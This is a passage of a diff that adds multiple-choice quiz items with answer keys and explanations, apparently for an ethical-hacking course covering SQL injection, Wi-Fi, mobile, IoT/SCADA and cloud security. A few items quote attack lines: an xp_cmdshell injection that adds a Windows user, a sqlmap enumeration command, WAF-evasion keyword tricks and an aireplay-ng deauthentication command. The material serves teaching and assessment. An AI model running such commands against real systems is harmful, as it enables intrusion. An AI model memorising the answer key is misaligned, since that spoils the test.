+      ],
+      "correctAnswer": 1,
+      "explanation": "Parameterized queries (prepared statements) are the most effective defense against SQL injection because they separate SQL code from user-supplied data. The database engine treats user input strictly as data, never as executable SQL code, regardless of the characters contained in the input. WAFs and input filtering can be bypassed, making them supplementary rather than primary defenses.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 147,
+      "moduleId": 15,
+      "question": "A penetration tester uses sqlmap with the following command: sqlmap -u 'http://target.com/page?id=1' --dbs --batch. What does this command accomplish?",
+      "options": [
+        "It performs a denial-of-service attack against the database",
+        "It tests the parameter 'id' for SQL injection and attempts to enumerate all database names",
+        "It creates a backup of all databases on the target server",
+        "It brute-forces the database administrator password"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The sqlmap command tests the 'id' parameter for SQL injection vulnerabilities. The --dbs flag instructs sqlmap to enumerate all available database names on the server, and --batch runs sqlmap in non-interactive mode using default answers. sqlmap is the most widely used open-source SQL injection automation tool and supports various injection techniques and database management systems.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 148,
+      "moduleId": 15,
+      "question": "An attacker exploits a SQL injection vulnerability in a Microsoft SQL Server to execute: '; EXEC xp_cmdshell 'net user hacker P@ss123 /add' --\nWhat is the attacker achieving?",
+      "options": [
+        "Extracting all usernames from the application database",
+        "Using the xp_cmdshell stored procedure to create a new Windows user account on the database server",
+        "Modifying the SQL Server configuration to allow remote connections",
+        "Performing a denial-of-service attack by overloading the command shell"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The attacker uses SQL Server's xp_cmdshell extended stored procedure to execute operating system commands. The command 'net user hacker P@ss123 /add' creates a new Windows user account named 'hacker' on the database server. This represents a critical escalation from SQL injection to operating system-level access. xp_cmdshell should be disabled in production environments.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 149,
+      "moduleId": 15,
+      "question": "What is second-order SQL injection, and why is it particularly dangerous?",
+      "options": [
+        "It requires two separate SQL queries to execute and is detected by standard WAFs",
+        "The malicious payload is stored in the database and triggered when a different application function retrieves and uses the stored data in a new SQL query",
+        "It only works on secondary database replicas, not the primary server",
+        "It uses two different injection points simultaneously to bypass input validation"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Second-order (stored) SQL injection occurs when user input is safely stored in the database but later retrieved and incorporated into a new SQL query without proper parameterization. It is particularly dangerous because the initial input passes all validation checks at entry, and developers often trust data already in their own database, making this vulnerability harder to detect during code review.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 150,
+      "moduleId": 15,
+      "question": "An attacker discovers a SQL injection point but finds that UNION, SELECT, and common SQL keywords are blocked by a WAF. Which advanced evasion technique could bypass this filtering?",
+      "options": [
+        "Switching from GET to POST request method",
+        "Using case variation (SeLeCt), inline comments (SEL/**/ECT), or hex encoding to obfuscate blocked keywords",
+        "Increasing the request speed to overwhelm the WAF",
+        "Using HTTPS instead of HTTP to encrypt the payload"
+      ],
+      "correctAnswer": 1,
+      "explanation": "WAF evasion techniques for SQL injection include case variation (SeLeCt), inline comment insertion (SEL/**/ECT, UN/**/ION), URL encoding (%53%45%4C%45%43%54), and using equivalent functions or syntax alternatives. These techniques exploit differences in how the WAF and the database server parse and interpret the input, allowing the malicious SQL to pass through the WAF but still execute on the database.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 151,
+      "moduleId": 16,
+      "question": "Which encryption protocol used by WPA2 provides robust security for wireless networks?",
+      "options": [
+        "WEP (Wired Equivalent Privacy)",
+        "TKIP (Temporal Key Integrity Protocol)",
+        "AES-CCMP (Advanced Encryption Standard - Counter Mode with CBC-MAC Protocol)",
+        "RC4 (Rivest Cipher 4)"
+      ],
+      "correctAnswer": 2,
+      "explanation": "WPA2 uses AES-CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) as its mandatory encryption standard. AES-CCMP provides both data confidentiality (via AES in counter mode) and data integrity (via CBC-MAC). This is a significant improvement over WPA's TKIP, which was based on the weaker RC4 cipher.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 152,
+      "moduleId": 16,
+      "question": "What is an evil twin attack in wireless security?",
+      "options": [
+        "Connecting two wireless routers to create a redundant network",
+        "Setting up a rogue access point with the same SSID as a legitimate network to intercept traffic",
+        "Using two wireless adapters simultaneously to increase bandwidth",
+        "Cloning the MAC address of an authorized wireless device"
+      ],
+      "correctAnswer": 1,
+      "explanation": "An evil twin attack involves setting up a malicious access point that mimics a legitimate Wi-Fi network by using the same SSID and often a stronger signal. Unsuspecting users connect to the rogue AP, allowing the attacker to intercept all their network traffic, capture credentials, and perform man-in-the-middle attacks. It is especially effective in public Wi-Fi environments.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 153,
+      "moduleId": 16,
+      "question": "During a wireless penetration test, you capture a WPA2 four-way handshake between a client and an access point. What is the next step to attempt to recover the pre-shared key?",
+      "options": [
+        "Replay the handshake to the access point to gain access",
+        "Perform an offline dictionary or brute-force attack against the captured handshake using a tool like Aircrack-ng or Hashcat",
+        "Inject deauthentication frames to force all clients to disconnect",
+        "Use the captured handshake directly as the network password"
+      ],
+      "correctAnswer": 1,
+      "explanation": "After capturing the WPA2 four-way handshake, the attacker performs offline password cracking using tools like Aircrack-ng or Hashcat. These tools test candidate passwords by computing the Pairwise Master Key (PMK) and comparing it against the handshake data. The handshake itself doesn't contain the password but contains enough information to verify password guesses offline.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 154,
+      "moduleId": 16,
+      "question": "Which WPA3 feature prevents offline dictionary attacks against captured handshakes?",
+      "options": [
+        "Perfect Forward Secrecy (PFS)",
+        "Simultaneous Authentication of Equals (SAE), which replaces the PSK four-way handshake",
+        "Enhanced Open (OWE) for public networks",
+        "Management Frame Protection (MFP)"
+      ],
+      "correctAnswer": 1,
+      "explanation": "WPA3 uses Simultaneous Authentication of Equals (SAE), also known as the Dragonfly handshake, which replaces WPA2's Pre-Shared Key (PSK) four-way handshake. SAE is a zero-knowledge proof protocol that prevents offline dictionary attacks because capturing the handshake does not provide enough information to test passwords offline. Each handshake attempt requires live interaction with the access point.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 155,
+      "moduleId": 16,
+      "question": "What is the KRACK (Key Reinstallation Attack) vulnerability in WPA2?",
+      "options": [
+        "A brute-force attack against WPA2's AES encryption key",
+        "An attack that exploits the four-way handshake by forcing key reinstallation, allowing nonce reuse and traffic decryption",
+        "A vulnerability in WPA2's RADIUS authentication server",
+        "A denial-of-service attack that floods access points with authentication requests"
+      ],
+      "correctAnswer": 1,
+      "explanation": "KRACK exploits a flaw in the WPA2 four-way handshake process by manipulating and replaying handshake messages to force reinstallation of an already-in-use encryption key. This resets the nonce (packet number) counter, allowing the attacker to replay, decrypt, and in some cases forge packets. The vulnerability affects the protocol itself, meaning all correct WPA2 implementations were initially vulnerable.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 156,
+      "moduleId": 16,
+      "question": "A penetration tester runs the following Aircrack-ng command:\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\nWhat is this command doing?",
+      "options": [
+        "Associating with the access point using the specified MAC address",
+        "Sending 5 deauthentication frames to disconnect client 11:22:33:44:55:66 from access point AA:BB:CC:DD:EE:FF",
+        "Performing a brute-force attack against the access point's WPA2 key",
+        "Capturing the WPA2 handshake by passively monitoring channel 5"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The aireplay-ng command with -0 performs a deauthentication attack. The number 5 specifies sending 5 deauth frames, -a specifies the target access point's BSSID, and -c specifies the target client's MAC address. This forces the client to disconnect and reconnect, which can be used to capture the WPA2 four-way handshake for offline cracking.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 157,
+      "moduleId": 16,
+      "question": "Which Bluetooth attack involves an attacker sending unsolicited messages or files to nearby Bluetooth-enabled devices?",
+      "options": [
+        "Bluesnarfing",
+        "Bluejacking",
+        "BlueBorne",
+        "Bluebugging"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Bluejacking is the practice of sending unsolicited messages or business cards (vCards) to Bluetooth-enabled devices. While generally considered a nuisance rather than a serious security threat, it demonstrates that a device is discoverable and within range. Bluesnarfing (unauthorized data theft) and Bluebugging (taking control of a device) are more serious Bluetooth attacks.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 158,
+      "moduleId": 16,
+      "question": "During a wireless penetration test, you set up a rogue access point with the same SSID as the target corporate network and use a stronger signal. Several employees connect to your AP. You then present them with a captive portal mimicking the corporate login page. What is this combined attack called?",
+      "options": [
+        "Wardriving",
+        "Karma attack",
+        "Evil twin with captive portal phishing",
+        "WPS PIN brute-force attack"
+      ],
+      "correctAnswer": 2,
+      "explanation": "This is an evil twin attack combined with captive portal phishing. The rogue AP with the same SSID and stronger signal lures victims, and the fake captive portal captures their credentials. This is one of the most effective wireless attacks against enterprise users because it combines network impersonation with social engineering. Mutual authentication protocols like WPA2-Enterprise with certificate validation can mitigate this.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 159,
+      "moduleId": 16,
+      "question": "An attacker discovers a WPA2-Enterprise network using PEAP-MSCHAPv2. They set up a rogue RADIUS server and evil twin AP. What specific credential information can they capture?",
+      "options": [
+        "The access point's pre-shared key in plaintext",
+        "MSCHAPv2 challenge-response hashes that can be cracked offline to recover user passwords",
+        "The RADIUS server's shared secret key",
+        "The WPA2 Group Temporal Key (GTK) used for broadcast traffic"
+      ],
+      "correctAnswer": 1,
+      "explanation": "When attacking PEAP-MSCHAPv2 with a rogue RADIUS server, the attacker captures MSCHAPv2 challenge-response hashes during authentication. These hashes can be cracked offline using tools like asleap or hashcat. This attack is effective when clients don't validate the RADIUS server's certificate. Proper certificate validation on the client side prevents this attack.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 160,
+      "moduleId": 16,
+      "question": "What is the purpose of Wi-Fi Protected Setup (WPS) and why is it considered a security risk?",
+      "options": [
+        "WPS encrypts management frames; it is risky because it uses weak encryption",
+        "WPS simplifies connecting devices via an 8-digit PIN; it is vulnerable because the PIN can be brute-forced in approximately 11,000 attempts due to design flaws",
+        "WPS provides guest network isolation; it is risky because guests can access the main network",
+        "WPS enables mesh networking; it is vulnerable because it allows unauthorized APs to join the mesh"
+      ],
+      "correctAnswer": 1,
+      "explanation": "WPS was designed to simplify the process of connecting devices to a Wi-Fi network using an 8-digit PIN. However, the PIN is validated in two halves (4+3 digits plus a checksum), reducing the brute-force space from 100 million to approximately 11,000 combinations. Tools like Reaver and Bully can exploit this design flaw to recover the WPA/WPA2 passphrase regardless of its complexity.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 161,
+      "moduleId": 17,
+      "question": "What is the difference between rooting an Android device and jailbreaking an iOS device?",
+      "options": [
+        "Rooting installs a new operating system, while jailbreaking only changes settings",
+        "Both achieve similar goals: gaining elevated privileges and bypassing manufacturer restrictions, but on different mobile operating systems",
+        "Rooting is legal while jailbreaking is always illegal",
+        "Rooting only works on tablets, while jailbreaking works on phones"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Both rooting (Android) and jailbreaking (iOS) provide users with elevated (root/admin) privileges and bypass manufacturer-imposed restrictions. Rooting on Android typically involves unlocking the bootloader and installing a su binary, while jailbreaking iOS exploits vulnerabilities to gain root access and install unsigned apps. Both increase security risks by removing OS security controls.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 162,
+      "moduleId": 17,
+      "question": "According to the OWASP Mobile Top 10 (2024), which risk is ranked as the most critical?",
+      "options": [
+        "Insecure Data Storage",
+        "Improper Credential Usage",
+        "Inadequate Supply Chain Security",
+        "Insufficient Cryptography"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In the OWASP Mobile Top 10 2024 edition, Improper Credential Usage is ranked as the #1 risk (M1). This includes hardcoded credentials, insecure storage of API keys, improper use of biometric authentication, and insecure credential transmission. These issues allow attackers to gain unauthorized access to backend services and sensitive functionality.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 163,
+      "moduleId": 17,
+      "question": "An Android application stores user credentials in a SharedPreferences XML file without encryption. Where on the device can an attacker with root access find this file?",
+      "options": [
+        "/sdcard/Android/data/com.app.name/",
+        "/data/data/com.app.name/shared_prefs/",
+        "/system/app/com.app.name/config/",
+        "/cache/data/com.app.name/preferences/"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Android SharedPreferences files are stored as XML files in /data/data/<package_name>/shared_prefs/ directory. With root access, an attacker can read these files and extract any sensitive data stored in them. This is why the OWASP Mobile Top 10 emphasizes insecure data storage as a critical risk — sensitive data should be encrypted using Android's Keystore system or EncryptedSharedPreferences.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 164,
+      "moduleId": 17,
+      "question": "What is the purpose of Android's APK signing, and what happens if a user installs an unsigned or self-signed APK?",
+      "options": [
+        "APK signing encrypts the application code; unsigned APKs cannot be installed at all",
+        "APK signing verifies the developer's identity and ensures code integrity; Android will not install APKs unless the user explicitly enables 'Unknown Sources' or uses ADB",
+        "APK signing is optional and only required for apps distributed through Google Play",
+        "APK signing compresses the application; unsigned APKs are larger in file size"
+      ],
+      "correctAnswer": 1,
+      "explanation": "APK signing ensures code integrity and developer identity verification. Android requires all APKs to be digitally signed before installation. While Google Play apps are verified through the store's review process, sideloaded APKs require the user to enable 'Install from Unknown Sources,' creating a significant attack vector for malware distribution through social engineering.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 165,
+      "moduleId": 17,
+      "question": "A security researcher discovers that a popular banking app on iOS does not implement certificate pinning. What attack does this make possible?",
+      "options": [
+        "Buffer overflow attacks against the iOS kernel",
+        "Man-in-the-middle attacks where an attacker with a trusted CA certificate can intercept encrypted HTTPS traffic",
+        "Jailbreak exploits that bypass the app sandbox",
+        "SQL injection attacks against the app's local SQLite database"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Without certificate pinning, an app trusts any certificate signed by a trusted Certificate Authority (CA). An attacker who can install a rogue CA certificate on the device (via MDM profile, social engineering, or compromised CA) can perform MitM attacks on HTTPS connections. Certificate pinning ensures the app only trusts specific certificates or public keys, preventing this attack even with a valid rogue certificate.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 166,
+      "moduleId": 17,
+      "question": "What is the Android application sandbox, and how does it protect user data?",
+      "options": [
+        "It is a virtual machine that runs each app in an emulated environment",
+        "Each Android app runs as a separate Linux user with its own UID, preventing apps from accessing each other's data by default",
+        "It encrypts all app data using the device's hardware security module",
+        "It restricts all apps from accessing the internet without explicit firewall rules"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Android leverages Linux's user-based protection model to create application sandboxes. Each installed app receives a unique Linux UID and runs in its own process. This kernel-level isolation prevents apps from accessing each other's files, memory, and resources by default. Inter-app communication must occur through defined mechanisms like intents, content providers, or explicitly shared permissions.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 167,
+      "moduleId": 17,
+      "question": "During mobile application penetration testing, you use Frida to hook into a running Android application. What capability does Frida provide?",
+      "options": [
+        "It scans the APK for known malware signatures",
+        "It performs dynamic instrumentation, allowing runtime modification of app behavior, method hooking, and bypassing security controls like root detection and SSL pinning",
+        "It decompiles the APK to Java source code for static analysis",
+        "It creates automated UI tests for the mobile application"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Frida is a dynamic instrumentation toolkit that allows security researchers to inject JavaScript into running processes. In mobile security testing, Frida is used to hook into methods at runtime, bypass root/jailbreak detection, disable SSL certificate pinning, modify function return values, and trace API calls. It works on both Android and iOS applications without modifying the APK/IPA.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 168,
+      "moduleId": 17,
+      "question": "An attacker creates a malicious Android app that requests the following permissions: READ_SMS, READ_CONTACTS, RECORD_AUDIO, ACCESS_FINE_LOCATION, and CAMERA. The app is disguised as a simple flashlight application. What type of mobile threat does this represent?",
+      "options": [
+        "A legitimate app with standard permissions for flashlight functionality",
+        "Spyware/Trojan disguised as a benign app, requesting excessive and unnecessary permissions for surveillance",
+        "An adware app that displays ads based on user location",
+        "A potentially unwanted program (PUP) with bundled software"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A flashlight app has no legitimate need for permissions to read SMS, contacts, record audio, access fine location, or use the camera. This excessive permission request pattern is a strong indicator of spyware or a Trojan horse that uses the flashlight functionality as a cover for surveillance activities. The principle of least privilege should be applied when evaluating mobile app permissions.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 169,
+      "moduleId": 17,
+      "question": "A security team discovers that their enterprise MDM (Mobile Device Management) solution has been bypassed on several employee devices. The devices show signs of jailbreaking with tools like unc0ver. What is the MOST critical immediate security concern?",
+      "options": [
+        "The devices will consume more battery power",
+        "The OS security controls (sandboxing, code signing, and app store restrictions) are disabled, exposing corporate data to unauthorized access and malware",
+        "The devices cannot receive future iOS updates",
+        "The devices' warranty is voided by the manufacturer"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Jailbroken devices bypass critical iOS security controls including application sandboxing, mandatory code signing, and app store restrictions. This means malicious or unauthorized apps can access corporate data, enterprise credentials, and other apps' protected storage. The MDM bypass combined with jailbreaking creates a severe data exfiltration risk that should trigger immediate incident response procedures.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 170,
+      "moduleId": 17,
+      "question": "An Android malware sample uses the DexClassLoader to dynamically load a secondary DEX file downloaded from a remote server at runtime. Why is this technique particularly effective at evading detection?",
+      "options": [
+        "DexClassLoader encrypts all network traffic automatically",
+        "The malicious code is not present in the original APK, so static analysis and app store scanners only see benign code; the malicious payload is loaded dynamically after installation",
+        "DexClassLoader runs code in a separate sandbox that prevents detection",
+        "The technique requires root access, which most malware scanners don't have"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Dynamic code loading via DexClassLoader allows malware to download and execute code that was not present in the original APK. Since app store security scanners and static analysis tools examine the submitted APK, the malicious functionality is invisible at review time. The actual malicious payload is retrieved from a remote server only after the app is installed and running on the victim's device, effectively bypassing pre-installation security checks.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 171,
+      "moduleId": 18,
+      "question": "What does MQTT stand for, and what is its primary use in IoT?",
+      "options": [
+        "Multiple Query Telemetry Transport; it is used for database queries in IoT",
+        "Message Queuing Telemetry Transport; it is a lightweight publish-subscribe messaging protocol designed for constrained IoT devices",
+        "Mobile Quick Token Transfer; it is used for IoT device authentication",
+        "Managed Queue Transaction Technology; it is used for IoT firmware updates"
+      ],
+      "correctAnswer": 1,
+      "explanation": "MQTT (Message Queuing Telemetry Transport) is a lightweight publish-subscribe messaging protocol designed for IoT and constrained environments with low bandwidth and unreliable networks. Devices publish messages to topics, and subscribers receive messages from topics they've subscribed to, with a central broker managing message distribution. Its small code footprint makes it ideal for resource-limited IoT devices.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 172,
+      "moduleId": 18,
+      "question": "Which of the following is a common security vulnerability in IoT devices?",
+      "options": [
+        "Using quantum-resistant encryption algorithms",
+        "Default or hardcoded credentials that users cannot change",
+        "Implementing mutual TLS authentication for all communications",
+        "Regular over-the-air firmware updates with signed packages"
+      ],
+      "correctAnswer": 1,
+      "explanation": "One of the most prevalent IoT security issues is the use of default, hardcoded, or easily guessable credentials. Many IoT devices ship with factory-default usernames and passwords (e.g., admin/admin) that users never change, or worse, credentials that are hardcoded in firmware and cannot be changed. The Mirai botnet exploited exactly this vulnerability to compromise millions of IoT devices.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 173,
+      "moduleId": 18,
+      "question": "What is the Zigbee protocol, and in which IoT context is it commonly used?",
+      "options": [
+        "A high-bandwidth protocol for streaming video from IoT cameras",
+        "A low-power, short-range wireless mesh networking protocol commonly used in smart home automation and industrial sensors",
+        "A cellular protocol for connecting IoT devices to 5G networks",
+        "A wired protocol for connecting SCADA systems in industrial environments"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Zigbee is an IEEE 802.15.4-based wireless protocol designed for low-power, low-data-rate, short-range communication in IoT applications. It supports mesh networking topology, allowing devices to relay messages through other devices. Zigbee is widely used in smart home devices (lights, sensors, locks), industrial monitoring, and healthcare applications.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 174,
+      "moduleId": 18,
+      "question": "In the context of OT (Operational Technology) security, what is a SCADA system and why is it a high-value target for attackers?",
+      "options": [
+        "SCADA is a software development framework; it is targeted because it contains source code for industrial applications",
+        "SCADA (Supervisory Control and Data Acquisition) monitors and controls industrial processes; it is targeted because compromising it can cause physical damage to critical infrastructure",
+        "SCADA is a database management system for IoT; it is targeted for the data it stores",
+        "SCADA is a network firewall for OT environments; it is targeted to gain network access"
+      ],
+      "correctAnswer": 1,
+      "explanation": "SCADA (Supervisory Control and Data Acquisition) systems monitor and control industrial processes in sectors like power generation, water treatment, oil and gas, and manufacturing. They are high-value targets because compromising them can cause physical damage, disrupt critical services, and endanger human safety. The Stuxnet worm demonstrated the potential impact by damaging Iranian nuclear centrifuges through SCADA manipulation.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 175,
+      "moduleId": 18,
+      "question": "A security researcher discovers that an IoT smart lock communicates with its cloud server over unencrypted HTTP and accepts firmware updates without digital signature verification. Which two attacks are MOST likely to be effective?",
+      "options": [
+        "SQL injection and cross-site scripting",
+        "Man-in-the-middle traffic interception and malicious firmware injection",
+        "Phishing and social engineering against the lock manufacturer",
+        "DNS spoofing and ARP poisoning against the cloud server"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Unencrypted HTTP communication allows man-in-the-middle attackers to intercept credentials, commands, and data in transit. The lack of firmware signature verification means an attacker can inject malicious firmware that the device will accept and install as legitimate. Together, these vulnerabilities could allow an attacker to completely compromise the smart lock and gain physical access.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 176,
+      "moduleId": 18,
+      "question": "What is CoAP (Constrained Application Protocol) and how does it differ from HTTP in IoT communications?",
+      "options": [
+        "CoAP is a TCP-based protocol that is identical to HTTP but with a smaller header",
+        "CoAP is a lightweight UDP-based protocol designed for constrained IoT devices, using less overhead than HTTP while following a similar request-response model",
+        "CoAP is an encryption protocol that replaces TLS for IoT devices",
+        "CoAP is a hardware protocol for connecting sensors to microcontrollers"
+      ],
+      "correctAnswer": 1,
+      "explanation": "CoAP (Constrained Application Protocol) is a specialized RESTful protocol designed for constrained IoT devices and networks. Unlike HTTP, which uses TCP, CoAP runs over UDP, significantly reducing overhead and making it suitable for devices with limited memory, processing power, and battery life. CoAP supports features like multicast, resource discovery, and can be secured using DTLS (Datagram Transport Layer Security).",
+      "difficulty": "medium"
+    },
+    {
+      "id": 177,
+      "moduleId": 18,
+      "question": "An attacker connects to an MQTT broker and subscribes to the wildcard topic '#'. What information could they potentially access?",
+      "options": [
+        "Only the broker's configuration settings",
+        "All messages published to all topics on the broker, potentially including sensor data, commands, and credentials",
+        "Only system health metrics of the broker",
+        "Only messages specifically addressed to their client ID"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In MQTT, the '#' wildcard matches all topics at all levels. If the broker does not implement proper authentication and authorization (ACLs), subscribing to '#' allows an attacker to receive every message published to the broker. This could expose sensitive IoT data including sensor readings, device commands, authentication tokens, and control messages. MQTT brokers must enforce authentication and topic-level access controls.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 178,
+      "moduleId": 18,
+      "question": "What is the Purdue Model (also known as the Purdue Enterprise Reference Architecture) in the context of ICS/SCADA security?",
+      "options": [
+        "A vulnerability scoring system for IoT devices",
+        "A hierarchical network segmentation model that defines security zones and levels for industrial control systems, from physical processes to enterprise networks",
+        "A penetration testing methodology specifically for SCADA systems",
+        "A compliance framework for medical IoT devices"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The Purdue Model is a reference architecture that defines hierarchical levels (0-5) for industrial control system networks, from the physical process level (Level 0) through sensors and PLCs (Levels 1-2), operations management (Level 3), to the enterprise network (Levels 4-5). It guides network segmentation and security zone design to protect critical OT systems from IT network threats through proper isolation and controlled access between levels.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 179,
+      "moduleId": 18,
+      "question": "A security team discovers that an IoT device manufacturer has embedded the same private RSA key in the firmware of all devices of the same model. What is the critical security implication of this practice?",
+      "options": [
+        "The devices will have slower encryption performance",
+        "Extracting the key from one device compromises the encrypted communications of ALL devices of that model, as they all share the same private key",
+        "The devices cannot perform firmware updates",
+        "The devices will be incompatible with TLS 1.3"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Sharing the same private key across all devices of a model means that extracting the key from a single device (through firmware analysis, JTAG debugging, or side-channel attacks) compromises every device. An attacker can then decrypt traffic, impersonate any device, and sign malicious firmware for the entire product line. Each device should have a unique key pair provisioned during manufacturing.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 180,
+      "moduleId": 18,
+      "question": "An attacker targets an industrial control system by sending specially crafted Modbus TCP packets to a PLC (Programmable Logic Controller) to modify register values controlling a water treatment facility's chemical dosing. What makes this attack particularly dangerous?",
+      "options": [
+        "Modbus TCP uses strong encryption that the attacker must first decrypt",
+        "Modbus TCP has no built-in authentication or encryption, meaning any device on the network can read and write PLC registers without credentials",
+        "The PLC will automatically shut down when it receives unauthorized commands",
+        "The attack requires physical access to the PLC's serial port"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The Modbus protocol was designed in 1979 without security features. Modbus TCP provides no authentication, authorization, or encryption. Any device that can reach the PLC on the network can read sensor values and write commands to modify process parameters. In critical infrastructure like water treatment, this could lead to dangerous chemical imbalances affecting public safety. Network segmentation and industrial firewalls are essential compensating controls.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 181,
+      "moduleId": 19,
+      "question": "In the cloud shared responsibility model, who is responsible for patching the guest operating system on an IaaS (Infrastructure as a Service) deployment?",
+      "options": [
+        "The cloud service provider exclusively",
+        "The customer (tenant) is responsible for patching guest OS, applications, and data",
+        "Both the provider and customer share equal responsibility for OS patching",
+        "Neither party; OS patching is automated by the hypervisor"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In the shared responsibility model for IaaS, the cloud provider is responsible for the underlying infrastructure (hardware, hypervisor, network). The customer is responsible for everything they deploy on that infrastructure, including the guest operating system, applications, data, and security configurations. Understanding this division is crucial for maintaining cloud security.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 182,
+      "moduleId": 19,
+      "question": "What is a container escape vulnerability in cloud environments?",
+      "options": [
+        "When a container exceeds its allocated memory and crashes",
+        "When an attacker breaks out of a container's isolation to access the host system or other containers",
+        "When a container image is downloaded from an untrusted registry",
+        "When a container fails to start due to misconfigured environment variables"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A container escape occurs when an attacker exploits vulnerabilities in the container runtime (e.g., Docker, containerd), kernel, or misconfigurations to break out of the container's isolation and access the underlying host operating system or other containers. This is one of the most critical container security risks because it can lead to complete host compromise and lateral movement across the container infrastructure.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 183,
+      "moduleId": 19,
+      "question": "A security team discovers that their Docker containers are running as root. Why is this a security concern, and what is the recommended practice?",
+      "options": [
+        "Running as root improves container performance; it is actually recommended",
+        "Running as root means a container escape would give the attacker root access on the host; containers should run as non-root users with minimal privileges",
+        "Running as root prevents the container from accessing network resources",
+        "Running as root disables container logging, making forensics impossible"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Containers running as root (UID 0) pose a significant risk because if an attacker achieves a container escape, they inherit root privileges on the host system. Best practices include running containers as non-root users using the USER directive in Dockerfiles, enabling user namespace remapping, dropping unnecessary Linux capabilities, and using read-only file systems where possible.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 184,
+      "moduleId": 19,
+      "question": "What are the security risks associated with serverless computing (FaaS - Function as a Service)?",
+      "options": [
+        "Serverless functions cannot be encrypted, exposing all code to attackers",
+        "Risks include over-privileged function permissions, insecure dependencies, injection through event data, and sensitive data exposure in environment variables",
+        "Serverless functions are immune to all traditional application attacks",
+        "The only risk is vendor lock-in, as there are no security-specific concerns"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Serverless computing introduces unique security challenges including over-privileged IAM roles assigned to functions, injection attacks through event triggers (API Gateway, S3 events, etc.), vulnerable third-party dependencies, secrets stored in plaintext environment variables, and insufficient function-level monitoring. While the provider manages infrastructure security, application-level security remains the customer's responsibility.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 185,
+      "moduleId": 19,
+      "question": "An attacker discovers that an AWS S3 bucket named 'company-backups' has its ACL set to public-read. What is the immediate security implication?",
+      "options": [
+        "The bucket can only be read by authenticated AWS users within the same account",
+        "Anyone on the internet can list and download all objects in the bucket without authentication",
+        "The bucket's data is encrypted and cannot be read even with public access",
+        "Only the bucket name is exposed; the contents remain protected"
+      ],
+      "correctAnswer": 1,
+      "explanation": "An S3 bucket with public-read ACL allows anyone on the internet to list and download all objects stored in the bucket without any authentication. This has been the cause of numerous major data breaches where companies accidentally exposed customer data, credentials, and proprietary information. AWS now blocks public access by default, but legacy configurations may still be vulnerable.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 186,
+      "moduleId": 19,
+      "question": "What is the Zero Trust security model, and how does it apply to cloud environments?",
+      "options": [
+        "Zero Trust means no encryption is trusted, so all data must be encrypted twice",
+        "Zero Trust assumes no user, device, or network is inherently trusted, requiring continuous verification of identity and authorization for every access request regardless of location",
+        "Zero Trust means zero users are allowed to access cloud resources without VPN",
+        "Zero Trust is a pricing model where cloud resources have zero cost during trial periods"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The Zero Trust model operates on the principle of 'never trust, always verify.' It assumes that threats exist both inside and outside the network perimeter. Every access request is fully authenticated, authorized, and encrypted before granting access, regardless of the user's network location. In cloud environments, this is implemented through identity-based access controls, micro-segmentation, least-privilege policies, and continuous monitoring.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 187,
+      "moduleId": 19,
